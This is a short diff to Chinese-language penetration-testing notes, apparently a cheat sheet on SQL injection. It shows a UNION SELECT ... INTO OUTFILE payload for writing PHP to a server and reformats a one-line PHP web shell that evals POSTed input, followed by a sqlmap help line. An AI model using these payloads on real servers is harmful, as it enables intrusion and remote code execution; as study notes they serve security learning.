@@ -193,6 +193,9 @@ print(result['country_name'])
 - 用户权限足够高，最好为root
 - secure_file_priy不为NULL
 - union select 1,\<?php phpinfo();?>,3 into outfile '绝对路径'
-- 一句话木马：\<?php @eval($_POST['x']);?>
+- 一句话木马：
+```PHP
+<?php @eval($_POST['x']);?>
+```
 #### sqlmap使用
 - sqlmap -hh查看详细的帮助信息
